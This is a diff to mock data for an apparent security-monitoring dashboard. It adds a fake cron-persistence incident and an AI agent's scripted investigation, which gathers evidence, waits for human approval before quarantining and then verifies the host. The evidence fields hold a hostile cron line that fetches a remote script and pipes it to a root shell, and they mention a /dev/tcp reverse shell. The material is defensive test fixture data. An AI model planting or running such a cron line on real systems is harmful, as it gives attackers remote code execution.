@@ -1,5 +1,5 @@
 import type {
-  ActionRow, AiReview, Anomaly, AuditEntry, Host, Incident, PolicyBody, PolicyRow, Rule, Severity,
+  ActionRow, AgentTurn, AiReview, Anomaly, AuditEntry, Host, Incident, PolicyBody, PolicyRow, Rule, Severity,
 } from "../api/types";
 
 const now = Date.now();
@@ -16,6 +16,7 @@ export const HOSTS: Host[] = [
 ];
 const [WEB, DB] = HOSTS.map((h) => h.id);
 
+const CRON_INC = "inc-cron-persist-0000-4000-8000-000000000005";
 const RS_INC = "inc-reverse-shell-0000-4000-8000-000000000001";
 const mkA = (id: string, host: string, inc: string | null, min: number, rule: string, title: string, src: Anomaly["rule_source"], sev: Severity, summary: string, tags: string[], evidence: Record<string, unknown> | null, r2?: string): Anomaly => ({
   id, host_id: host, incident_id: inc, ts: t(min), rule_id: rule, rule_source: src, rule_title: title, category: "process", severity: sev, fingerprint: `${id}${"ab".repeat(30)}`.slice(0, 64),
@@ -47,6 +48,11 @@ export const INCIDENTS: Incident[] = [
   { id: "inc-pkg-0000-4000-8000-000000000004", host_id: DB, title: "Unexpected package manager execution", status: "investigating", verdict: null, severity: "info", confidence: null, attack_tags: [], ai_summary: null, analyst_note: null, workflow_id: "wf-4", closed_at: null, created_at: t(8), updated_at: t(7) },
 ];
 
+INCIDENTS.push({ id: CRON_INC, host_id: DB, title: "Root cron persistence on db-01", status: "resolved", verdict: "malicious", severity: "high", confidence: 0.91,
+  attack_tags: ["attack.persistence", "attack.t1053.003"], workflow_id: "wf-5", analyst_note: null, closed_at: null, created_at: t(240), updated_at: t(205),
+  ai_summary: "A hidden cron file in /etc/cron.d ran a remote script every minute as root. The file was quarantined after approval and the AI re-checked the host." });
+ANOMALIES.push(mkA("an-8", DB, CRON_INC, 240, "native:new_cron", "New cron entry created", "native", "high", "/etc/cron.d/.sysupd created by a non-root process", ["attack.persistence", "attack.t1053.003"], { path: "/etc/cron.d/.sysupd", sha256: "9b1f4c0de27a" }));
+
 export const REVIEWS: AiReview[] = [
   { id: "rv-1", incident_id: RS_INC, step: "triage", round: 0, model: "@cf/meta/llama-3.3-70b", prompt_hash: "9f2c", ts: t(41.5),
     output: { verdict: "suspicious", severity: "high", confidence: 0.62, rationale: "bash with /dev/tcp redirect spawned from nginx is a classic reverse shell pattern, but I need the process tree and live connections before concluding.",
@@ -64,6 +70,10 @@ export const REVIEWS: AiReview[] = [
     output: { verdict: "malicious", severity: "critical", confidence: 0.93, rationale: "Awaiting human approval of containment actions.", requests: [] }, gate: [] },
 ];
 
+REVIEWS.push({ id: "rv-5", incident_id: CRON_INC, step: "final", round: 1, model: "@cf/meta/llama-3.3-70b", prompt_hash: "d5e6", ts: t(205),
+  output: Object.assign({ verdict: "malicious" as const, severity: "high" as const, confidence: 0.91, rationale: "Investigation finished.", requests: [] },
+    { verification: "After quarantine, /etc/cron.d no longer contains .sysupd, no cron-spawned curl processes are running, and no outbound connections to 198.51.100.9 remain." }), gate: [] });
+
 const act = (o: Partial<ActionRow> & Pick<ActionRow, "id" | "host_id" | "action" | "params" | "state">): ActionRow => ({
   incident_id: null, tier: 0, kind: "command", proposed_by: "ai", rationale: null, approved_by: null, reject_reason: null, result: null, error: null, rollback_token: null, rollback_of: null,
   expires_at: null, created_at: t(30), updated_at: t(30), ...o,
@@ -72,9 +82,14 @@ export const ACTIONS: ActionRow[] = [
   act({ id: "ac-1", incident_id: RS_INC, host_id: WEB, action: "collect_evidence", params: { kind: "process_tree", target: "28113" }, state: "succeeded", created_at: t(41), result: { data: "nginx(1177)---bash(28113)---bash(28120)" } }),
   act({ id: "ac-2", incident_id: RS_INC, host_id: WEB, action: "raise_log_level", params: { ttl_seconds: 7200 }, state: "succeeded", created_at: t(38) }),
   act({ id: "ac-3", incident_id: RS_INC, host_id: WEB, action: "kill_process", params: { pid: 28113, start_time: "2026-11-12T09:14:22Z" }, tier: 1, state: "proposed", created_at: t(30),
-    rationale: "Terminates the interactive reverse shell (PID 28113) spawned by nginx. Stops attacker command execution immediately; the nginx master is unaffected.", expires_at: t(-60) }),
+    rationale: "Terminates the interactive reverse shell (PID 28113) spawned by nginx. Stops attacker command execution immediately; the nginx master is unaffected.", expires_at: t(-60),
+    critic: { decision: "submit", round: 1, concerns: ["PID 28113 may have exited before the kill lands; the start_time guard will make it a no-op rather than hit a reused PID."], missing_checks: ["Confirm the nginx master process is not the parent of 28113"] } }),
   act({ id: "ac-4", incident_id: RS_INC, host_id: WEB, action: "block_ip", params: { ip: "203.0.113.66", ttl_seconds: 86400 }, tier: 1, state: "proposed", created_at: t(30),
     rationale: "Blocks the C2 endpoint 203.0.113.66 (no prior history in fleet). Prevents re-connection and payload staging. Reversible via rollback.", expires_at: t(-60) }),
+  act({ id: "ac-6", incident_id: CRON_INC, host_id: DB, action: "collect_evidence", params: { kind: "file_sample", target: "/etc/cron.d/*" }, state: "succeeded", created_at: t(228), result: { data: "* * * * * root curl -s http://198.51.100.9/u | sh" } }),
+  act({ id: "ac-7", incident_id: CRON_INC, host_id: DB, action: "quarantine_file", params: { path: "/etc/cron.d/.sysupd", sha256: "9b1f4c0de27a" }, tier: 1, state: "succeeded", created_at: t(224), approved_by: "dev@local", rollback_token: "rb-q1",
+    rationale: "Hidden cron file runs a remote script every minute as root. Quarantining removes persistence without touching other cron entries.", result: {},
+    critic: { decision: "submit", round: 2, concerns: [], missing_checks: [] } }),
   act({ id: "ac-5", incident_id: "inc-ssh-bf-0000-4000-8000-000000000002", host_id: DB, action: "block_ip", params: { ip: "198.51.100.23", ttl_seconds: 3600 }, tier: 1, state: "succeeded", created_at: t(180), approved_by: "dev@local", rationale: "Brute-force source.", rollback_token: "rb-7d1c9a", result: {} }),
 ];
 
@@ -121,4 +136,27 @@ export const RULES: Rule[] = [
   rule(7, "Clear Command History", "medium", "active", ["attack.defense-evasion", "attack.t1070.003"], 6, 1, 2),
   rule(8, "Credential Dump from /etc/shadow", "critical", "active", ["attack.credential-access", "attack.t1003.008"], 1, 1, 0),
   rule(9, "Network Service Scanning Tool", "low", "shadow", ["attack.discovery", "attack.t1046"], 19, 0, 0),
+];
+
+const tc = (id: string, name: string, args: Record<string, unknown>) => ({ id, name, arguments: args });
+const turn = (n: number, min: number, role: AgentTurn["role"], content: AgentTurn["content"], tool_name: string | null = null, tool_call_id: string | null = null): AgentTurn =>
+  ({ id: `tu-${n}`, incident_id: CRON_INC, run_id: "run-1", seq: n, ts: t(min), role, tool_name, tool_call_id, content });
+export const TURNS: AgentTurn[] = [
+  turn(1, 239, "user", { text: "New incident on db-01: /etc/cron.d/.sysupd created by a non-root process. Investigate and contain if warranted." }),
+  turn(2, 238, "assistant", { text: "A dot-prefixed cron file is suspicious. I'll look at the process tree and the auth log first.", tool_calls: [tc("c1", "collect_evidence", { kind: "process_tree", target: "4417" }), tc("c2", "collect_evidence", { kind: "log_excerpt", target: "/root/.bash_history" })] }),
+  turn(3, 237, "tool", { result: { data: "sshd(901)---bash(4402)---sh(4417)---curl(4420)" } }, "collect_evidence", "c1"),
+  turn(4, 237, "tool", { error: "path not allowed: /root/.bash_history (log_excerpt is limited to /var/log)" }, "collect_evidence", "c2"),
+  turn(5, 235, "assistant", { tool_calls: [tc("c3", "fleet_search", { query: "198.51.100.9", window: "7d" })] }),
+  turn(6, 234, "tool", { result: { hosts: 1, matches: 3, first_seen: t(250) } }, "fleet_search", "c3"),
+  turn(7, 232, "assistant", { text: "The script host appears only on db-01. Proposing quarantine of the cron file.", tool_calls: [tc("c4", "propose_action", { action: "quarantine_file", params: { path: "/etc/cron.d/.sysupd" }, rationale: "Hidden root cron entry fetching a remote script." })] }),
+  turn(8, 231, "tool", { result: { critic: "revise", missing_checks: ["file_sample /etc/cron.d/*"] } }, "propose_action", "c4"),
+  turn(9, 230, "assistant", { text: "The reviewer wants to see the rest of cron.d before I act.", tool_calls: [tc("c5", "collect_evidence", { kind: "file_sample", target: "/etc/cron.d/*" })] }),
+  turn(10, 228, "tool", { result: { data: "/etc/cron.d/.sysupd: * * * * * root curl -s http://198.51.100.9/u | sh\n/etc/cron.d/logrotate: ordinary" } }, "collect_evidence", "c5"),
+  turn(11, 226, "assistant", { tool_calls: [tc("c6", "propose_action", { action: "quarantine_file", params: { path: "/etc/cron.d/.sysupd", sha256: "9b1f4c0de27a" }, rationale: "Only .sysupd is malicious; other cron.d entries are ordinary." })] }),
+  turn(12, 225, "tool", { result: { status: "proposed", action_id: "ac-7" } }, "propose_action", "c6"),
+  turn(13, 207, "assistant", { text: "Approved and executed. Verifying the host is clean.", tool_calls: [tc("c7", "collect_evidence", { kind: "file_sample", target: "/etc/cron.d/*" }), tc("c8", "collect_evidence", { kind: "netconns" })] }),
+  turn(14, 206, "tool", { result: { data: "/etc/cron.d/logrotate: ordinary" } }, "collect_evidence", "c7"),
+  turn(15, 206, "tool", { result: { data: "no connections to 198.51.100.9" } }, "collect_evidence", "c8"),
+  turn(16, 205, "assistant", { tool_calls: [tc("c9", "finish", { outcome: "verified", summary: "Cron persistence removed; no residual C2 connections." })] }),
+  turn(17, 205, "tool", { result: { status: "resolved" } }, "finish", "c9"),
 ];
